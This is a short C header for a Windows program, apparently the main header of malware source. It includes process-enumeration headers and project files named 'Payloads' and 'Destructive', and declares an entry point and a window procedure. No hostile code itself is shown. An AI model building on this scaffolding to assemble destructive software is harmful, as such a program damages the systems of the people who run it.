#define UNICODE

#include "../Build/Mode.h"

#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <psapi.h>
#include <commctrl.h>

#include "../Build/Data.h"
#include "Payloads/Payloads.h"
#include "Utils/Utils.h"

#include "Destructive/Destructive.h"

void start();

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);